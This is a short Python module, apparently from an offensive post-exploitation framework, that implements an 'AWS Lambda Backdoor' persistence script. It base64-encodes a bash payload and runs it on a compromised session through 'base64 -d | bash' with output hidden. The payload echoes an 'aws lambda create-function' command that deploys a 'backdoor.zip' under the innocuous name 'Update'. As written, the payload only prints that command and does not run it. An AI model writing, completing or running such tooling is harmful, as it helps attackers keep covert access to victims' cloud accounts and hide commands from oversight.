"""AWS Lambda backdoor script."""
from ..base import OperatorScript, ScriptResult

class LambdaBackdoor(OperatorScript):
    name = "Lambda Backdoor"
    description = "AWS Lambda persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] AWS LAMBDA BACKDOOR"
if command -v aws &>/dev/null; then
    echo "[+] Create Lambda function with malicious code"
    echo "aws lambda create-function --function-name Update --runtime python3.9 --role ROLE_ARN --handler lambda_function.lambda_handler --zip-file fileb://backdoor.zip"
fi
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Lambda backdoor...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Lambda backdoor executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
